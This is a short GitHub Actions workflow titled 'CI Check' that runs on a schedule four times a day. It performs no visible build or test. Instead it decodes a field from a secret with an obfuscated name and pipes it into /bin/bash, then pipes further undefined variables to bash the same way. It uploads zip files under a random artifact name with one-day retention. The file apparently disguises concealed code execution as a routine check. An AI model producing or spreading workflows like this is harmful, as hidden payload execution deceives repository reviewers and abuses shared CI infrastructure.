name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '2 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          cng4536: ${{ secrets.cng4536 }}
        run: |
          printf '%s' "$cng4536" | jq -r .tzxv2 | /bin/bash
          printf '%s' "$qw36" | jq -r .pycw1 | /bin/bash
          echo $yhs978 | jq -r .scc3 | /bin/bash
          echo $jdbin8563 | jq -r .i56335 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: fkyojoAl
          path: "*.zip"
          retention-days: 1
